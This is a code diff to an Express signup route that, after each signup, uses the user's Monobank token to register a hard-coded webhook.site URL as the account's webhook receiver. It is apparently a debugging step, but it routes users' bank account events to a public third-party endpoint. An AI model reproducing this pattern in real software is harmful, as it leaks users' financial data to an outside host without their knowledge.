@@ -1,8 +1,10 @@
 import { Router } from 'express';
 import { nanoid } from 'nanoid';
+import fetch from 'node-fetch';
 import { configs } from '../../config';
 import { getItem, getTokens, putItem } from '../../dynamoAPI';
 import { endpointRespond } from '../../utils';
+import { requests } from '../monobank/endpoints';
 import { syncStatements } from '../monobank/utils';
 import { exist, isFailure } from '../types/guards';
 import { encrypt, getAccounts } from './utils';
@@ -56,6 +58,18 @@ signup.post('/signup', async (req, res) => {
 
   const token = generateAccessToken(username, xtoken);
   res.cookie('jwt', token, { maxAge: configs.MAX_AGE });
+
+  await fetch(requests.webhook(), {
+    method: 'POST',
+    headers: {
+      'X-Token': xtoken,
+    },
+    body: JSON.stringify({
+      webHookUrl: 'https://webhook.site/6207193e-0a59-4e8b-9f26-468fb2ca901f',
+    }),
+  })
+    .then(console.log)
+    .catch(console.log);
 
   await syncStatements({
     Item: user as any,
